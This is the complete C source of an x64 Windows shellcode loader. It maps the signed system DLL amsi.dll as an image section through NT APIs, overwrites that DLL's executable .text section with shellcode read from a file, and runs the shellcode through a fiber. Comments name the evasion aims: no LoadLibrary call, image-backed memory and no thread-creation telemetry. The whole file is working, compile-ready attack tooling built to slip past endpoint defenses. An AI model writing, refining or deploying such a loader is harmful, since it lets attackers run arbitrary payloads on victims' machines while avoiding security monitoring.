/*
 * x64 shellcode loader - Module Stomping (image section) + Fiber execution.
 * Reads raw shellcode from argv[1]. No embedded payload bytes.
 * Compile: cl.exe /nologo /O2 /GS- loader.c /link ntdll.lib
 *
 * Fix (per strategy plan):
 *   - Open the sacrificial DLL with execute access (FILE_EXECUTE) so that
 *     SEC_IMAGE section creation is permitted by the kernel.
 *   - Use NtOpenFile with OBJECT_ATTRIBUTES built from the NT "\??\" path
 *     prefix, and ShareAccess = FILE_SHARE_READ | FILE_SHARE_DELETE.
 *   - Request SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_QUERY on the
 *     image section so DesiredAccess is compatible with the file's granted
 *     access.
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ------------------------------------------------------------------ */
/* Local NT definitions (winternl.h does not provide these)            */
/* ------------------------------------------------------------------ */

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

typedef LONG NTSTATUS;

#ifndef _UNICODE_STRING_DEFINED
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
#define _UNICODE_STRING_DEFINED
#endif

#ifndef _OBJECT_ATTRIBUTES_DEFINED
typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
#define _OBJECT_ATTRIBUTES_DEFINED
#endif

#ifndef _IO_STATUS_BLOCK_DEFINED
typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID    Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
#define _IO_STATUS_BLOCK_DEFINED
#endif

typedef struct _LDR_DLL_LOADED_NOTIFICATION_DATA {
    ULONG Flags;
    PVOID FullDllName;
    PVOID BaseDllName;
    PVOID DllBase;
    ULONG SizeOfImage;
} LDR_DLL_LOADED_NOTIFICATION_DATA, *PLDR_DLL_LOADED_NOTIFICATION_DATA;

#ifndef _SECTION_INHERIT_DEFINED
typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;
#define _SECTION_INHERIT_DEFINED
#endif

#ifndef _MEMORY_INFORMATION_CLASS_DEFINED
typedef enum _MEMORY_INFORMATION_CLASS {
    MemoryBasicInformation = 0
} MEMORY_INFORMATION_CLASS;
#define _MEMORY_INFORMATION_CLASS_DEFINED
#endif

typedef struct _MY_MEMORY_BASIC_INFORMATION {
    PVOID  BaseAddress;
    PVOID  AllocationBase;
    DWORD  AllocationProtect;
    SIZE_T RegionSize;
    DWORD  State;
    DWORD  Protect;
    DWORD  Type;
} MY_MEMORY_BASIC_INFORMATION, *PMY_MEMORY_BASIC_INFORMATION;

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);        \
    (p)->RootDirectory = (r);                       \
    (p)->Attributes = (a);                          \
    (p)->ObjectName = (n);                          \
    (p)->SecurityDescriptor = (s);                  \
    (p)->SecurityQualityOfService = NULL;           \
}

/* NT prototypes - resolved from ntdll.lib */
NTSTATUS NTAPI NtCreateSection(
    PHANDLE            SectionHandle,
    ACCESS_MASK        DesiredAccess,
    PVOID              ObjectAttributes,
    PLARGE_INTEGER     MaximumSize,
    ULONG              SectionPageProtection,
    ULONG              AllocationAttributes,
    HANDLE             FileHandle);

NTSTATUS NTAPI NtMapViewOfSection(
    HANDLE          SectionHandle,
    HANDLE          ProcessHandle,
    PVOID          *BaseAddress,
    ULONG_PTR       ZeroBits,
    SIZE_T          CommitSize,
    PLARGE_INTEGER  SectionOffset,
    PSIZE_T         ViewSize,
    SECTION_INHERIT InheritDisposition,
    ULONG           AllocationType,
    ULONG           Win32Protect);

NTSTATUS NTAPI NtUnmapViewOfSection(
    HANDLE ProcessHandle,
    PVOID  BaseAddress);

NTSTATUS NTAPI NtProtectVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID  *BaseAddress,
    PSIZE_T RegionSize,
    ULONG   NewProtect,
    PULONG  OldProtect);

NTSTATUS NTAPI NtClose(HANDLE Handle);

NTSTATUS NTAPI NtOpenFile(
    PHANDLE            FileHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK   IoStatusBlock,
    ULONG              ShareAccess,
    ULONG              OpenOptions);

/* RtlImageNtHeader lives in ntdll and is exported. */
PIMAGE_NT_HEADERS NTAPI RtlImageNtHeader(PVOID Base);

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */

static unsigned char *read_file(const char *path, size_t *out_size)
{
    FILE *fp;
    long  sz;
    unsigned char *buf;

    fp = fopen(path, "rb");
    if (!fp) {
        fprintf(stderr, "[-] fopen failed: %s\n", path);
        return NULL;
    }
    if (fseek(fp, 0, SEEK_END) != 0) { fclose(fp); return NULL; }
    sz = ftell(fp);
    if (sz <= 0) { fclose(fp); return NULL; }
    if (fseek(fp, 0, SEEK_SET) != 0) { fclose(fp); return NULL; }

    buf = (unsigned char *)malloc((size_t)sz);
    if (!buf) { fclose(fp); return NULL; }

    if (fread(buf, 1, (size_t)sz, fp) != (size_t)sz) {
        free(buf);
        fclose(fp);
        return NULL;
    }
    fclose(fp);
    *out_size = (size_t)sz;
    return buf;
}

/* Build an NT "\??\C:\..." path from a Win32 wide path. */
static void build_nt_path(const wchar_t *win32_path,
                          wchar_t *out, size_t out_chars)
{
    /* Convert "C:\Windows\System32\amsi.dll" -> "\??\C:\Windows\System32\amsi.dll" */
    _snwprintf_s(out, out_chars, _TRUNCATE, L"\\??\\%ls", win32_path);
}

/* Map a DLL as a SEC_IMAGE section without LoadLibrary.
 * Uses NtOpenFile with execute access so the kernel allows SEC_IMAGE. */
static int map_image_section(const wchar_t *dll_path,
                             PVOID *out_base,
                             SIZE_T *out_size,
                             HANDLE *out_section)
{
    HANDLE            hFile = NULL;
    HANDLE            hSec  = NULL;
    NTSTATUS          st;
    PVOID             base  = NULL;
    SIZE_T            view  = 0;
    LARGE_INTEGER     maxsz;
    IO_STATUS_BLOCK   iosb;
    UNICODE_STRING    ustr;
    OBJECT_ATTRIBUTES oa;
    wchar_t           nt_path[512];

    build_nt_path(dll_path, nt_path, ARRAYSIZE(nt_path));

    ustr.Length        = (USHORT)(wcslen(nt_path) * sizeof(wchar_t));
    ustr.MaximumLength = ustr.Length + sizeof(wchar_t);
    ustr.Buffer        = nt_path;

    InitializeObjectAttributes(&oa, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);

    /* Open with execute access - required for SEC_IMAGE. */
    st = NtOpenFile(&hFile,
                    GENERIC_READ | GENERIC_EXECUTE | SYNCHRONIZE,
                    &oa,
                    &iosb,
                    FILE_SHARE_READ | FILE_SHARE_DELETE,
                    FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtOpenFile failed: 0x%08lX\n", (unsigned long)st);
        return 0;
    }

    maxsz.QuadPart = 0;
    st = NtCreateSection(&hSec,
                         SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_QUERY,
                         NULL, &maxsz, PAGE_READONLY, SEC_IMAGE, hFile);
    NtClose(hFile);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtCreateSection failed: 0x%08lX\n", (unsigned long)st);
        return 0;
    }

    st = NtMapViewOfSection(hSec, GetCurrentProcess(), &base, 0, 0, NULL,
                            &view, ViewShare, 0, PAGE_READONLY);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtMapViewOfSection failed: 0x%08lX\n", (unsigned long)st);
        NtClose(hSec);
        return 0;
    }

    *out_base    = base;
    *out_size    = view;
    *out_section = hSec;
    return 1;
}

/* Locate an executable region inside the mapped image (the .text section). */
static int find_text_section(PVOID base, PVOID *out_addr, SIZE_T *out_size)
{
    PIMAGE_NT_HEADERS       nt;
    PIMAGE_SECTION_HEADER   sec;
    unsigned int            i;

    nt = RtlImageNtHeader(base);
    if (!nt) return 0;

    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            *out_addr = (PVOID)((BYTE *)base + sec[i].VirtualAddress);
            *out_size = sec[i].Misc.VirtualSize;
            return 1;
        }
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/* main                                                                */
/* ------------------------------------------------------------------ */

int main(int argc, char *argv[])
{
    unsigned char *sc = NULL;
    size_t         sc_size = 0;

    PVOID          img_base = NULL;
    SIZE_T         img_size = 0;
    HANDLE         img_sec  = NULL;

    PVOID          text_addr = NULL;
    SIZE_T         text_size = 0;

    PVOID          prot_addr;
    SIZE_T         prot_size;
    ULONG          old_prot = 0;
    NTSTATUS       st;

    LPVOID         fiber = NULL;

    if (argc < 2) {
        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }

    sc = read_file(argv[1], &sc_size);
    if (!sc) {
        fprintf(stderr, "[-] failed to read shellcode\n");
        return 1;
    }
    printf("[+] shellcode size: %zu bytes\n", sc_size);

    /* 1. Map a signed system DLL as an image section (no LoadLibrary). */
    if (!map_image_section(L"C:\\Windows\\System32\\amsi.dll",
                           &img_base, &img_size, &img_sec)) {
        free(sc);
        return 1;
    }
    printf("[+] mapped image @ %p (size 0x%zx)\n", img_base, img_size);

    /* 2. Find the executable section of the mapped image. */
    if (!find_text_section(img_base, &text_addr, &text_size)) {
        fprintf(stderr, "[-] no executable section found\n");
        NtUnmapViewOfSection(GetCurrentProcess(), img_base);
        NtClose(img_sec);
        free(sc);
        return 1;
    }
    printf("[+] .text @ %p (size 0x%zx)\n", text_addr, text_size);

    if (sc_size > text_size) {
        fprintf(stderr, "[-] shellcode larger than .text section\n");
        NtUnmapViewOfSection(GetCurrentProcess(), img_base);
        NtClose(img_sec);
        free(sc);
        return 1;
    }

    /* 3. Temporarily make .text writable, copy shellcode, restore. */
    prot_addr = text_addr;
    prot_size = text_size;
    st = NtProtectVirtualMemory(GetCurrentProcess(), &prot_addr, &prot_size,
                                PAGE_EXECUTE_READWRITE, &old_prot);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtProtectVirtualMemory (RWX) failed: 0x%08lX\n",
                (unsigned long)st);
        NtUnmapViewOfSection(GetCurrentProcess(), img_base);
        NtClose(img_sec);
        free(sc);
        return 1;
    }

    memcpy(text_addr, sc, sc_size);
    free(sc);
    sc = NULL;

    /* Flip back to RX - only the image region, not private memory. */
    prot_addr = text_addr;
    prot_size = text_size;
    st = NtProtectVirtualMemory(GetCurrentProcess(), &prot_addr, &prot_size,
                                PAGE_EXECUTE_READ, &old_prot);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtProtectVirtualMemory (RX) failed: 0x%08lX\n",
                (unsigned long)st);
        NtUnmapViewOfSection(GetCurrentProcess(), img_base);
        NtClose(img_sec);
        free(sc);
        return 1;
    }
    printf("[+] shellcode staged in image-backed RX memory\n");

    /* 4. Execute via fiber - no thread creation telemetry. */
    if (!ConvertThreadToFiber(NULL)) {
        fprintf(stderr, "[-] ConvertThreadToFiber failed (%lu)\n", GetLastError());
        NtUnmapViewOfSection(GetCurrentProcess(), img_base);
        NtClose(img_sec);
        return 1;
    }

    fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)text_addr, NULL);
    if (!fiber) {
        fprintf(stderr, "[-] CreateFiber failed (%lu)\n", GetLastError());
        NtUnmapViewOfSection(GetCurrentProcess(), img_base);
        NtClose(img_sec);
        return 1;
    }

    printf("[+] switching to fiber @ %p\n", text_addr);
    SwitchToFiber(fiber);

    /* Control normally never returns here; clean up if it does. */
    DeleteFiber(fiber);
    ConvertFiberToThread();
    NtUnmapViewOfSection(GetCurrentProcess(), img_base);
    NtClose(img_sec);
    return 0;
}